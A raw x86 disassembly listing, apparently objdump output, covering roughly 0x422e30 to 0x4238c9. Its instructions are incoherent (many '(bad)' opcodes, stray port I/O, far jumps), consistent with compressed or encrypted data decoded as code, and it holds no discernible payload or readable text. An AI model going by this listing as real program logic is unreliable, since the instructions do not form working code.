  422e30:	jp     0x422e71
  422e32:	or     al,0x3f
  422e34:	dec    ebp
  422e35:	push   ebp
  422e36:	lods   eax,DWORD PTR ds:[esi]
  422e37:	scas   al,BYTE PTR es:[edi]
  422e38:	mov    DWORD PTR [ebx],esp
  422e3a:	add    cl,BYTE PTR [ecx+eiz*1-0xb]
  422e3e:	and    cl,BYTE PTR [edi]
  422e40:	mov    WORD PTR [ebp+0x3db9e720],ds
  422e46:	jmp    0x422ea3
  422e48:	cli    
  422e49:	inc    esp
  422e4a:	xchg   ebp,eax
  422e4b:	fidiv  WORD PTR [ecx-0x7642ac13]
  422e51:	shr    bh,cl
  422e53:	bound  ebx,QWORD PTR [eax-0x717a2d3]
  422e59:	mov    BYTE PTR [esi-0x6f4006a6],ah
  422e5f:	xor    DWORD PTR [eax],eax
  422e61:	dec    edx
  422e62:	xchg   esp,eax
  422e63:	popf   
  422e64:	mov    edi,0x90da8dad
  422e69:	scas   eax,DWORD PTR es:[edi]
  422e6a:	into   
  422e6b:	push   cs
  422e6c:	mov    bl,0x80
  422e6e:	xor    DWORD PTR [ebx-0x6],ecx
  422e71:	repz push edx
  422e73:	dec    esi
  422e74:	mov    esp,0xed2ad58d
  422e79:	sti    
  422e7a:	rcr    BYTE PTR [ecx-0x38a7803f],0x30
  422e81:	add    ch,BYTE PTR [esi+0x18]
  422e84:	jmp    0x58799150
  422e89:	cmp    eax,0xf078f8ed
  422e8e:	fisubr WORD PTR [ecx]
  422e90:	daa    
	...
  422ef1:	add    BYTE PTR [eax],al
  422ef3:	add    BYTE PTR [ebx-0x21e677ab],al
  422ef9:	fst    QWORD PTR [ebx+0x33b808df]
  422eff:	retf   0xab42
  422f02:	pop    esp
  422f03:	dec    ebp
  422f04:	cld    
  422f05:	je     0x422f08
  422f07:	add    BYTE PTR ds:0x72000001,al
  422f0d:	or     dh,BYTE PTR [eax-0x2122c15]
  422f13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f14:	mov    dl,0x86
  422f16:	and    eax,0x4525ea8
  422f1b:	mov    ah,0x35
  422f1d:	daa    
  422f1e:	jecxz  0x422f1b
  422f20:	pop    esi
  422f21:	cli    
  422f22:	fcom   st(2)
  422f24:	mul    DWORD PTR [esi-0x18]
  422f27:	sub    edx,DWORD PTR ds:0xc59b05ad
  422f2d:	ror    BYTE PTR ds:0x4efd0719,cl
  422f33:	lods   eax,DWORD PTR ds:[esi]
  422f34:	pop    ecx
  422f35:	cmp    DWORD PTR [esi],esp
  422f37:	in     eax,dx
  422f38:	jne    0x422fab
  422f3a:	stos   DWORD PTR es:[edi],eax
  422f3b:	cmp    eax,esp
  422f3d:	and    al,0x4b
  422f3f:	shl    ebp,cl
  422f41:	in     eax,dx
  422f42:	nop
  422f43:	imul   esi,esi,0x4
  422f46:	std    
  422f47:	sti    
  422f48:	mov    eax,0x22228263
  422f4d:	jbe    0x422f76
  422f4f:	adc    al,0x57
  422f51:	cmp    DWORD PTR ds:[esi+0x472dba13],edx
  422f58:	mov    bl,0x3a
  422f5a:	(bad)  [edx-0x21]
  422f5d:	shl    BYTE PTR [eax+edi*1-0x61d742da],1
  422f64:	mov    ds:0x69a351ef,eax
  422f69:	(bad)  
  422f6a:	(bad)  
  422f6c:	sub    DWORD PTR [ebx-0x2f2bf1e3],edi
  422f72:	sub    al,0x37
  422f74:	adc    bh,0xe4
  422f77:	sahf   
  422f78:	test   BYTE PTR ds:0xadfd46db,ah
  422f7e:	stc    
  422f7f:	mov    BYTE PTR [ebx],0x31
  422f82:	sar    al,0xff
  422f85:	mov    ecx,0xadf03ba
  422f8a:	jmp    0x2ced32fc
  422f8f:	mov    dh,0x7d
  422f91:	mov    BYTE PTR [esp+edx*8+0x7f2fea8e],dh
  422f98:	push   ebx
  422f99:	cmp    bl,BYTE PTR [edx+ebp*8+0x6b1fb30b]
  422fa0:	dec    ebp
  422fa1:	sbb    esp,esp
  422fa3:	adc    al,BYTE PTR [edi-0x766084f2]
  422fa9:	push   0x3c
  422fab:	ins    DWORD PTR es:[edi],dx
  422fac:	push   eax
  422fad:	repz int3 
  422faf:	mov    ds:0xd05a10b9,eax
  422fb4:	adc    eax,0xc5f62b81
  422fb9:	aad    0xf6
  422fbb:	hlt    
  422fbc:	mov    esi,0x762dafd2
  422fc1:	or     al,0x44
  422fc3:	(bad)  
  422fc5:	sbb    al,0x0
  422fc7:	pop    eax
  422fc8:	xor    BYTE PTR [eax-0x2b],ch
  422fcb:	dec    esi
  422fcc:	mov    cl,BYTE PTR [esi]
  422fce:	mov    DWORD PTR [esi-0x25],esp
  422fd1:	das    
  422fd2:	mov    dl,0xae
  422fd4:	fwait
  422fd5:	mov    ds:0xa98b3a3f,eax
  422fda:	ss push ebp
  422fdc:	or     al,0x45
  422fde:	mov    ebp,DWORD PTR [ebp-0x52]
  422fe1:	aaa    
  422fe2:	punpckhdq mm4,mm0
  422fe5:	xor    DWORD PTR [esi+0x31776ec6],esp
  422feb:	mov    edi,eax
  422fed:	add    BYTE PTR [eax],ch
  422fef:	pop    esi
  422ff0:	retf   
  422ff1:	daa    
  422ff2:	scas   al,BYTE PTR es:[edi]
  422ff3:	pop    ecx
  422ff4:	das    
  422ff5:	js     0x423003
  422ff7:	mov    dl,0xb4
  422ff9:	push   es
  422ffa:	cld    
  422ffb:	scas   eax,DWORD PTR es:[edi]
  422ffc:	pop    edi
  422ffd:	push   ds
  422ffe:	les    edx,FWORD PTR [ecx-0x5c6c7ae3]
  423004:	jmp    0xc961:0x8e7738f2
  42300b:	in     eax,0xae
  42300d:	in     eax,0x26
  42300f:	imul   ebp,DWORD PTR [edi+0x0],0x0
	...
  423072:	add    BYTE PTR [eax],al
  423074:	inc    esi
  423075:	in     al,0x62
  423077:	mov    dl,ah
  423079:	mov    gs,esi
  42307b:	out    dx,al
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [ebx+ecx*8+0x1c62b07],esp
  423085:	jbe    0x423088
  423087:	add    BYTE PTR ds:0x7000001,al
  42308d:	(bad)  
  42308e:	(bad)  
  423090:	pop    ss
  423091:	mov    dh,0x7e
  423093:	jne    0x42305b
  423095:	adc    dh,BYTE PTR [edx-0x59]
  423098:	xor    BYTE PTR [ecx],bh
  42309a:	jle    0x4230c4
  42309c:	js     0x4230fd
  42309e:	xchg   edx,eax
  42309f:	int3   
  4230a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230a1:	push   ebp
  4230a2:	sub    BYTE PTR [esi-0x298463a1],al
  4230a8:	push   ecx
  4230a9:	xchg   dl,ch
  4230ab:	es lock stos BYTE PTR es:[edi],al
  4230ae:	cli    
  4230af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230b0:	add    eax,0xa4da53d9
  4230b5:	inc    esi
  4230b6:	fisubr DWORD PTR [eax+eiz*8-0x13]
  4230ba:	and    DWORD PTR [ecx],eax
  4230bc:	stos   DWORD PTR es:[edi],eax
  4230bd:	jl     0x423101
  4230bf:	icebp  
  4230c0:	cmp    eax,ebp
  4230c2:	push   eax
  4230c3:	cmp    BYTE PTR [esi+edx*8-0x1c1f2bca],cl
  4230ca:	mov    BYTE PTR [esi-0x7d],0x5e
  4230ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230cf:	push   0x4a2bf202
  4230d4:	imul   ecx,DWORD PTR [ebx+0x45],0xffffffac
  4230d8:	out    dx,al
  4230d9:	popf   
  4230da:	pusha  
  4230db:	fldlg2 
  4230dd:	xchg   edx,ebx
  4230df:	ficomp DWORD PTR [edi]
  4230e1:	push   es
  4230e2:	xchg   DWORD PTR [ebx+eax*8-0x52],eax
  4230e6:	aad    0x8c
  4230e8:	mov    edi,DWORD PTR [edx]
  4230ea:	xchg   ebx,eax
  4230eb:	cmp    DWORD PTR [edx-0x26],esp
  4230ee:	std    
  4230ef:	sub    dh,BYTE PTR [esi]
  4230f1:	xor    al,bh
  4230f3:	lods   eax,DWORD PTR ds:[esi]
  4230f4:	popf   
  4230f5:	pushf  
  4230f6:	ja     0x423085
  4230f8:	into   
  4230f9:	xor    eax,0x75d8d99d
  4230fe:	popf   
  4230ff:	mov    edi,0xe68f6989
  423104:	cmp    eax,0x92d3e7c5
  423109:	jle    0x4230b9
  42310b:	sbb    eax,edx
  42310d:	repz fiadd DWORD PTR [edi]
  423110:	xchg   bh,dl
  423112:	jle    0x423168
  423114:	mov    ecx,0x7031b3ba
  423119:	stos   DWORD PTR es:[edi],eax
  42311a:	jo     0x423114
  42311c:	ins    DWORD PTR es:[edi],dx
  42311d:	fsin   
  42311f:	fs mov dh,cl
  423122:	push   cs
  423123:	sahf   
  423124:	les    eax,FWORD PTR [ecx+ebx*4+0x45a750ce]
  42312b:	xor    DWORD PTR [ecx+edx*2],ebp
  42312e:	std    
  42312f:	push   esp
  423130:	adc    eax,0x28b8d0a4
  423135:	dec    eax
  423136:	sbb    esp,eax
  423138:	ret    
  423139:	and    eax,0x69d80ed3
  42313e:	mov    cl,0xcf
  423140:	inc    eax
  423141:	mov    al,0x3d
  423143:	int3   
  423144:	mov    al,dl
  423146:	push   ss
  423147:	std    
  423148:	push   0x8
  42314a:	mov    bl,0x27
  42314c:	sub    ah,BYTE PTR [eax]
  42314e:	cmp    ah,BYTE PTR [edx]
  423150:	mov    ah,0x4d
  423152:	fiadd  DWORD PTR [edx]
  423154:	inc    ebp
  423155:	adc    dl,BYTE PTR [esi-0x27db8755]
  42315b:	lods   eax,DWORD PTR ds:[esi]
  42315c:	rcr    esp,1
  42315e:	mov    cl,0x65
  423160:	jbe    0x4231a8
  423162:	call   0xe377:0xba643541
  423169:	dec    ebp
  42316a:	add    al,0x64
  42316c:	sub    BYTE PTR [esi+0xa],0xc4
  423170:	scas   al,BYTE PTR es:[edi]
  423171:	and    ecx,DWORD PTR [ecx+0x3]
  423174:	pop    es
  423175:	sbb    BYTE PTR [esi+eiz*4+0x4a],0xe4
  42317a:	fsubrp st(1),st
  42317c:	jne    0x423138
  42317e:	inc    eax
  42317f:	in     al,0x84
  423181:	cmp    edx,DWORD PTR cs:[edx]
  423184:	in     al,0x82
  423186:	push   es
  423187:	aas    
  423188:	lods   eax,DWORD PTR ds:[esi]
  423189:	dec    eax
  42318a:	adc    BYTE PTR fs:[ecx],ah
  42318d:	iret   
  42318e:	mov    ch,0xce
  423190:	fld    DWORD PTR [eax]
	...
  4231f2:	add    BYTE PTR [eax],al
  4231f4:	jns    0x4231e7
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx+0xfd0653e],esp
  423204:	push   es
  423205:	ja     0x423208
  423207:	add    BYTE PTR ds:0x88000001,al
  42320d:	mov    BYTE PTR [ebx],cl
  42320f:	dec    ecx
  423210:	mov    eax,0x15639400
  423215:	xor    dl,0xf1
  423218:	psubw  mm5,mm7
  42321b:	xor    eax,0xf60b8be7
  423220:	jno    0x423278
  423222:	xor    BYTE PTR [esi+0x1741bb91],dl
  423228:	mov    edi,0x8ccfc7a2
  42322d:	adc    BYTE PTR [edi+0xb],bl
  423230:	add    al,0xb5
  423232:	(bad)  
  423233:	loopne 0x423227
  423235:	mov    BYTE PTR [eax],ch
  423237:	adc    esi,DWORD PTR [esi-0x125c8e4]
  42323d:	xor    BYTE PTR [ebx+eax*8],dh
  423240:	pop    ebx
  423241:	pushf  
  423242:	add    al,cl
  423244:	sub    BYTE PTR [ebx+0x6fb0409b],ch
  42324a:	mov    eax,0x539af1e1
  42324f:	das    
  423250:	test   eax,0x291d654f
  423255:	cmp    esp,edi
  423257:	sbb    eax,0xf2fb4c73
  42325c:	out    0x59,eax
  42325e:	ror    BYTE PTR [esi+0x68d60dab],1
  423264:	hlt    
  423265:	call   0xe84a9795
  42326a:	lock in al,0x4c
  42326d:	sub    eax,0xc8e5bcfb
  423272:	nop
  423273:	jmp    DWORD PTR [ebx]
  423275:	or     dl,BYTE PTR [edx-0x9cc49e6]
  42327b:	and    eax,DWORD PTR [ebx+edi*2+0x28e12be8]
  423282:	cwde   
  423283:	sub    bh,bl
  423285:	test   DWORD PTR [edi-0x4f],0xc18c8cdb
  42328c:	in     al,0x8c
  42328e:	int3   
  42328f:	sbb    ecx,0xffffffc5
  423292:	ds nop
  423294:	pop    esp
  423295:	jge    0x423316
  423297:	adc    al,0x85
  423299:	std    
  42329a:	jg     0x423271
  42329c:	std    
  42329d:	jb     0x423274
  42329f:	mov    al,ds:0xee20246d
  4232a4:	in     eax,dx
  4232a5:	sub    dl,BYTE PTR ds:0xcbaa784a
  4232ab:	bound  esi,QWORD PTR [esi]
  4232ad:	arpl   WORD PTR [ebp+0x2e17afe8],bp
  4232b3:	iret   
  4232b4:	sar    DWORD PTR [edx+0x66],1
  4232b7:	repnz test DWORD PTR [esi-0x46cb861d],esi
  4232be:	or     DWORD PTR [ecx],ebp
  4232c0:	push   ebx
  4232c1:	and    esi,DWORD PTR [edx]
  4232c3:	ret    0x5d55
  4232c6:	call   0x34998a89
  4232cb:	mov    esi,0xb75f136b
  4232d0:	mov    dh,0x40
  4232d2:	cwde   
  4232d3:	cmp    dl,BYTE PTR [edi-0x2db89b37]
  4232d9:	jne    0x423263
  4232db:	cmp    eax,0x9cc04bbd
  4232e0:	es push edi
  4232e2:	inc    esi
  4232e3:	dec    ebx
  4232e4:	adc    BYTE PTR [edi],0xb9
  4232e7:	xchg   ebp,eax
  4232e8:	sar    edi,1
  4232ea:	jl     0x423338
  4232ec:	scas   al,BYTE PTR es:[edi]
  4232ed:	mov    eax,ds:0x5e417737
  4232f2:	sub    BYTE PTR [eax+eax*8-0x2582ba3e],cl
  4232f9:	sti    
  4232fa:	pop    esp
  4232fb:	scas   al,BYTE PTR es:[edi]
  4232fc:	out    dx,eax
  4232fd:	ret    0x36d
  423300:	mov    bl,BYTE PTR [ebx]
  423302:	aaa    
  423303:	outs   dx,BYTE PTR ds:[esi]
  423304:	push   0x3f
  423306:	mov    ds:0x7db4e833,al
  42330b:	jmp    0xe2:0xf1a923fe
	...
  423372:	add    BYTE PTR [eax],al
  423374:	clc    
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0x795d0f44
  423382:	out    0xa2,eax
  423384:	or     edi,DWORD PTR [eax+0x1]
  423387:	add    BYTE PTR ds:0x9a000001,al
  42338d:	loop   0x423340
  42338f:	stos   DWORD PTR es:[edi],eax
  423390:	imul   ecx,DWORD PTR [esi],0xf11dba04
  423396:	jns    0x4233d3
  423398:	lods   eax,DWORD PTR ds:[esi]
  423399:	jo     0x42336d
  42339b:	(bad)  
  42339c:	cmc    
  42339d:	cwde   
  42339e:	pop    es
  42339f:	in     al,0x44
  4233a1:	mov    al,BYTE PTR [edx+0x5a6e0d5c]
  4233a7:	rcl    BYTE PTR [edi],0xa0
  4233aa:	hlt    
  4233ab:	xchg   edx,eax
  4233ac:	test   DWORD PTR [eax+0x74338a0c],eax
  4233b2:	ror    DWORD PTR [edx+0x5ee6cbfd],1
  4233b8:	push   ecx
  4233b9:	mov    edx,DWORD PTR [esi+0x777926cc]
  4233bf:	jmp    0x1e1165ee
  4233c4:	push   edx
  4233c5:	data16 shl BYTE PTR [edi],cl
  4233c8:	fnstenv [edx]
  4233ca:	inc    eax
  4233cb:	ficom  WORD PTR [edi-0x1afd3edc]
  4233d1:	daa    
  4233d2:	xchg   esp,eax
  4233d3:	and    al,0x89
  4233d5:	mov    bl,BYTE PTR [esi]
  4233d7:	mov    edi,0x5bc730b1
  4233dc:	cmp    al,0x38
  4233de:	stc    
  4233df:	xor    al,0x2b
  4233e1:	aad    0x73
  4233e3:	ja     0x42344a
  4233e5:	sbb    ch,BYTE PTR [esi+0x0]
  4233e8:	jnp    0x423376
  4233ea:	es xchg eax,esp
  4233ed:	sahf   
  4233ee:	add    cl,BYTE PTR [eax+0x14]
  4233f1:	push   0xfffffff5
  4233f3:	pusha  
  4233f4:	call   0x970bdb53
  4233f9:	pop    esp
  4233fa:	add    cl,cl
  4233fc:	sar    BYTE PTR [ecx],0xa9
  4233ff:	dec    eax
  423400:	popa   
  423401:	xchg   BYTE PTR [edi-0x58],ah
  423404:	jo     0x42344a
  423406:	adc    ch,dl
  423408:	push   ebp
  423409:	cmp    dh,0x2e
  42340c:	call   0xdbd0615
  423411:	mov    ebp,0x9e31c776
  423416:	sub    eax,0x5709d950
  42341b:	popf   
  42341c:	lods   eax,DWORD PTR ds:[esi]
  42341d:	push   0x35843e64
  423422:	push   ecx
  423423:	loopne 0x423413
  423425:	pusha  
  423426:	adc    esi,esi
  423428:	inc    ebx
  423429:	jbe    0x4233ec
  42342b:	fldcw  WORD PTR [edi-0x3]
  42342e:	mov    ebx,0xfca3b689
  423433:	scas   al,BYTE PTR es:[edi]
  423434:	push   es
  423435:	pushf  
  423436:	cmp    DWORD PTR [eax+esi*8-0xa238a46],0xffffff94
  42343e:	clc    
  42343f:	adc    edi,eax
  423441:	sub    eax,0xcf7d9b44
  423446:	fist   WORD PTR es:[esi-0x69]
  42344a:	jle    0x423411
  42344c:	mov    dh,BYTE PTR [edi+0x2e]
  42344f:	in     eax,0x7a
  423451:	not    DWORD PTR [edi+0x2fd00787]
  423457:	fs sahf 
  423459:	or     ch,dl
  42345b:	fistp  QWORD PTR [eax+ebx*8]
  42345e:	(bad)  
  42345f:	nop
  423460:	push   ecx
  423461:	mov    edx,0x695a0d1a
  423466:	jg     0x423446
  423468:	push   esp
  423469:	jae    0x423456
  42346b:	or     al,0x6d
  42346d:	push   es
  42346e:	inc    esi
  42346f:	out    0x16,eax
  423471:	daa    
  423472:	fsubr  QWORD PTR [ecx-0x3f]
  423475:	dec    eax
  423476:	dec    ebx
  423477:	jge    0x423491
  423479:	mul    DWORD PTR [edx+esi*1-0x188f1653]
  423480:	dec    ecx
  423481:	gs push cs
  423483:	xchg   ebp,eax
  423484:	add    DWORD PTR [esi-0x6834a9a6],0xc32de24d
  42348e:	add    DWORD PTR [eax+0x51],0x0
	...
  4234f1:	add    BYTE PTR [eax],al
  4234f3:	add    al,al
  4234f5:	mov    al,0x45
  4234f7:	outs   dx,DWORD PTR ds:[esi]
  4234f8:	jne    0x4234f9
  4234fa:	jmp    0xe01f:0xadf467bf
  423501:	pusha  
  423502:	(bad)  
  423503:	(bad)  
  423504:	adc    BYTE PTR [ecx+0x1],bh
  423507:	add    BYTE PTR ds:0x65000001,al
  42350d:	into   
  42350e:	sbb    al,0x5f
  423510:	jae    0x42358b
  423512:	call   0x6306:0x3558cb68
  423519:	ins    DWORD PTR es:[edi],dx
  42351a:	imul   ecx,DWORD PTR [ebx+0x2e],0x98ea3831
  423521:	cmp    esi,DWORD PTR [esi+0x6f]
  423524:	fisubr DWORD PTR [ecx]
  423526:	(bad)  
  423527:	adc    ecx,eax
  423529:	sbb    ch,0xc0
  42352c:	push   ebx
  42352d:	mov    cl,BYTE PTR [ebx+ebx*2]
  423530:	leave  
  423531:	and    dl,BYTE PTR ss:[edi+0x1ef49b21]
  423538:	mov    ebp,0x9872c914
  42353d:	daa    
  42353e:	mov    ds:0x96cc2d7a,al
  423543:	stos   DWORD PTR es:[edi],eax
  423544:	xor    ebp,esi
  423546:	pop    ecx
  423547:	jbe    0x423574
  423549:	mov    al,ds:0x64ee9557
  42354e:	mov    bh,0x48
  423550:	daa    
  423551:	pop    ds
  423552:	repz (bad) 
  423554:	jg     0x4235b9
  423556:	dec    ebx
  423557:	cli    
  423558:	scas   al,BYTE PTR es:[edi]
  423559:	inc    eax
  42355a:	sub    BYTE PTR ss:[edi],ch
  42355d:	call   0x1af9f9a9
  423562:	popa   
  423563:	inc    edx
  423564:	jge    0x4234e9
  423566:	or     BYTE PTR [eax],dh
  423568:	sar    BYTE PTR [ecx+0x58],0x64
  42356c:	xchg   edi,esp
  42356e:	sub    al,0x75
  423570:	data16 add al,0xe5
  423573:	xchg   esp,eax
  423574:	outs   dx,DWORD PTR ds:[esi]
  423575:	pop    esp
  423576:	ins    DWORD PTR es:[edi],dx
  423577:	repz int 0x65
  42357a:	nop
  42357b:	pop    es
  42357c:	or     al,0xdd
  42357e:	test   al,0xb2
  423580:	or     al,0x34
  423582:	pop    ecx
  423583:	out    0x22,eax
  423585:	dec    DWORD PTR [ebp+0x56]
  423588:	(bad)  
  423589:	hlt    
  42358a:	adc    dh,al
  42358c:	and    al,0xd6
  42358e:	adc    al,0x5a
  423590:	jo     0x423552
  423592:	shr    DWORD PTR [edx+ebp*1-0x65a3fb40],cl
  423599:	cld    
  42359a:	ins    BYTE PTR es:[edi],dx
  42359b:	in     eax,dx
  42359c:	push   ebp
  42359d:	adc    BYTE PTR [ebx-0x7f],cl
  4235a0:	mov    dl,0xb4
  4235a2:	lahf   
  4235a3:	out    0x63,eax
  4235a5:	das    
  4235a6:	jmp    FWORD PTR [eax+0x687181cf]
  4235ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4235ad:	xchg   ebp,eax
  4235ae:	add    BYTE PTR [esi-0x5209f35c],bh
  4235b4:	in     al,dx
  4235b5:	js     0x423614
  4235b7:	sub    al,0x9b
  4235b9:	popa   
  4235ba:	ror    edx,cl
  4235bc:	lock stc 
  4235be:	ret    0x9ef6
  4235c1:	sbb    DWORD PTR [edx-0x5fa176ee],ecx
  4235c7:	shl    ecx,1
  4235c9:	loop   0x4235af
  4235cb:	stc    
  4235cc:	mov    esp,DWORD PTR ds:[edx+0x7486ab28]
  4235d3:	lock dec bx
  4235d6:	fisttp DWORD PTR [eax+0xc5cef8f]
  4235dc:	push   0x4e
  4235de:	sub    al,BYTE PTR [ecx]
  4235e0:	call   0x95fe:0xa73e5858
  4235e7:	ret    
  4235e8:	cwde   
  4235e9:	xchg   esi,eax
  4235ea:	push   es
  4235eb:	cmc    
  4235ec:	out    dx,eax
  4235ed:	les    esp,FWORD PTR [ebp+eax*8-0x76caaf68]
  4235f4:	stc    
  4235f5:	mov    dh,bh
  4235f7:	(bad)  
  4235f8:	jecxz  0x42357f
  4235fa:	cmp    eax,0x148a225
  4235ff:	scas   al,BYTE PTR es:[edi]
  423600:	sub    ecx,ecx
  423602:	ficomp WORD PTR [edi]
  423604:	popf   
  423605:	cmp    eax,0xd38d77ce
  42360a:	pop    ds
  42360b:	fsub   st,st(0)
  42360d:	imul   edi,DWORD PTR [ebp+0x76],0x9b
	...
  423674:	or     BYTE PTR [edi-0x8808b84],0x88
  42367b:	jmp    FWORD PTR [esi-0x6f]
  42367e:	jl     0x423693
  423680:	mul    DWORD PTR [edi]
  423682:	mov    edi,0x17a1511
  423687:	add    BYTE PTR ds:0xfb000001,al
  42368d:	add    eax,0xd55e72e1
  423692:	mov    ds:0x3cdbdcea,al
  423697:	jmp    0x62a7a9b7
  42369c:	sahf   
  42369d:	jbe    0x423639
  42369f:	mov    ebx,0xc67b50e6
  4236a4:	cmp    al,0x99
  4236a6:	arpl   WORD PTR [ebx+ecx*8+0x10],dx
  4236aa:	add    DWORD PTR [ebx],ecx
  4236ac:	or     DWORD PTR [edi+0x2752fd71],eax
  4236b2:	mov    eax,DWORD PTR [esi]
  4236b4:	loope  0x423672
  4236b6:	loopne 0x423691
  4236b8:	dec    ebp
  4236b9:	stos   BYTE PTR es:[edi],al
  4236ba:	data16 jno 0x42367e
  4236bd:	test   eax,0xb8163cad
  4236c3:	xor    DWORD PTR [edi+0x5afdfedf],edi
  4236c9:	pop    ds
  4236ca:	pop    esi
  4236cb:	stos   DWORD PTR es:[edi],eax
  4236cc:	xchg   esp,eax
  4236cd:	(bad)  
  4236ce:	(bad)  
  4236d0:	ret    
  4236d1:	mov    al,ds:0x6f5ad2aa
  4236d6:	mov    al,ds:0xa37828d5
  4236db:	loopne 0x4236b4
  4236dd:	mov    al,ds:0x742306f6
  4236e2:	out    0xb2,eax
  4236e4:	lds    edi,FWORD PTR [ebp+0xdd97b74]
  4236ea:	out    0x7b,eax
  4236ec:	es daa 
  4236ee:	mov    eax,0x8de12ec3
  4236f3:	cdq    
  4236f4:	(bad)  
  4236f5:	jmp    0x96e804ed
  4236fa:	stos   DWORD PTR es:[edi],eax
  4236fb:	test   DWORD PTR [ecx],ebp
  4236fd:	or     ecx,DWORD PTR [edi+0x2e]
  423700:	sbb    eax,0xda2bbfbc
  423705:	into   
  423706:	loope  0x4236e0
  423708:	jp     0x423784
  42370a:	jg     0x4236e3
  42370c:	jne    0x42370a
  42370e:	cmp    al,dl
  423710:	mov    ecx,0xd5e2af0c
  423715:	add    al,0xe3
  423717:	out    dx,al
  423718:	iret   
  423719:	in     al,dx
  42371a:	hlt    
  42371b:	stc    
  42371c:	xor    eax,0xb97fc057
  423721:	(bad)  
  423722:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423723:	sar    DWORD PTR [ebx-0x3cb9e3e9],0x54
  42372a:	dec    ecx
  42372b:	int    0xc6
  42372d:	push   ecx
  42372e:	test   eax,0x869f7b26
  423733:	xor    DWORD PTR [edi-0x74f9297e],edx
  423739:	mov    edi,0xec1e1915
  42373e:	ror    cl,cl
  423740:	(bad)  
  423741:	push   esi
  423742:	push   cs
  423743:	into   
  423744:	lods   al,BYTE PTR ds:[esi]
  423745:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423746:	dec    edx
  423747:	jns    0x42373e
  423749:	push   0xffffffb0
  42374b:	jmp    0xe3905951
  423750:	jp     0x4237ac
  423752:	or     al,0x9a
  423754:	pop    esi
  423755:	mov    dl,0x8a
  423757:	xchg   edx,eax
  423758:	and    al,0x2
  42375a:	xchg   edx,eax
  42375b:	jnp    0x4236eb
  42375d:	dec    ebx
  42375e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42375f:	sahf   
  423760:	sti    
  423761:	inc    eax
  423762:	sub    al,0x90
  423764:	mov    dh,0x24
  423766:	es cmp edx,ebx
  423769:	mov    eax,0xbd8930a1
  42376e:	repnz cld 
  423770:	pop    eax
  423771:	mov    edi,0x17762d61
  423776:	cwde   
  423777:	cs imul ebp,esi,0x861c30c5
  42377e:	je     0x423712
  423780:	add    al,0x61
  423782:	stos   DWORD PTR es:[edi],eax
  423783:	popf   
  423784:	jns    0x423765
  423786:	xor    dl,BYTE PTR [ecx]
  423788:	xchg   ecx,eax
  423789:	or     eax,0x4b4e222b
  42378e:	cli    
  42378f:	sub    edx,DWORD PTR [edx]
	...
  4237f1:	add    BYTE PTR [eax],al
  4237f3:	add    BYTE PTR [ebx+eiz*1],dh
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7b1a:0x6db6baeb
  423806:	add    DWORD PTR [eax],eax
  423808:	add    eax,0x5c000001
  42380d:	test   eax,0xd405fb12
  423812:	iret   
  423813:	loop   0x4237fd
  423815:	fcmovnu st,st(5)
  423817:	cmp    DWORD PTR [esi-0x2e],edx
  42381a:	jle    0x423869
  42381c:	lahf   
  42381d:	xlat   BYTE PTR ds:[ebx]
  42381e:	adc    al,BYTE PTR [ebx+0x15]
  423821:	and    ebx,edi
  423823:	(bad)  [ecx-0x24]
  423826:	sbb    BYTE PTR [eax-0x28c060d4],dl
  42382c:	and    eax,0x3d01007a
  423831:	cmp    DWORD PTR [esi+0x6b17a7fd],ebp
  423837:	lock sbb eax,0x3b323f8e
  42383e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42383f:	fild   WORD PTR [ebp-0x21]
  423842:	adc    BYTE PTR [ebx+eiz*1-0x34],0x7b
  423847:	xor    ch,cl
  423849:	jmp    0x423858
  42384b:	push   0x31
  42384d:	push   ebp
  42384e:	pusha  
  42384f:	xchg   ecx,eax
  423850:	fnstcw WORD PTR [esi+0x3c8bd285]
  423856:	xor    al,0x80
  423858:	lods   al,BYTE PTR ds:[esi]
  423859:	dec    esp
  42385a:	imul   esp,DWORD PTR [edi+ecx*4],0xc
  42385e:	or     eax,0x5435fcba
  423863:	stos   BYTE PTR es:[edi],al
  423864:	repz fld DWORD PTR [edi]
  423867:	inc    ebx
  423868:	inc    ebp
  423869:	jmp    0x423833
  42386b:	mov    fs,WORD PTR [edx]
  42386d:	shl    BYTE PTR [ecx],1
  42386f:	jae    0x423858
  423871:	ret    0x2e34
  423874:	mov    ah,0x5b
  423876:	je     0x42384f
  423878:	cmp    edi,DWORD PTR [edx]
  42387a:	mov    dh,0xf0
  42387c:	push   ecx
  42387d:	and    ebx,DWORD PTR [edx]
  42387f:	out    0xd6,al
  423881:	push   eax
  423882:	out    dx,al
  423883:	xchg   ecx,eax
  423884:	xor    edx,DWORD PTR [ebx+0x37ded7fd]
  42388a:	mov    DWORD PTR [edx-0x32],esi
  42388d:	mov    esp,0x88c2c90a
  423892:	aam    0x99
  423894:	test   al,0xdb
  423896:	fidiv  DWORD PTR [edi+0x68ac75a7]
  42389c:	sbb    al,0x25
  42389e:	arpl   di,bp
  4238a0:	sub    DWORD PTR [eax-0xae3ad00],0x764f26f3
  4238aa:	ins    BYTE PTR es:[di],dx
  4238ac:	ins    DWORD PTR es:[edi],dx
  4238ad:	out    dx,al
  4238ae:	rcr    DWORD PTR [ecx+0x541898b9],0xbf
  4238b5:	scas   eax,DWORD PTR es:[edi]
  4238b6:	fcmovu st,st(0)
  4238b8:	outs   dx,BYTE PTR ds:[esi]
  4238b9:	mov    eax,ds:0x9f538ed9
  4238be:	(bad)  
  4238bf:	pop    edx
  4238c0:	dec    ecx
  4238c1:	pop    edi
  4238c2:	bound  esi,QWORD PTR [ebx+0x2eab3d78]
  4238c8:	popa   
  4238c9:	mov    edx,0xd711a313
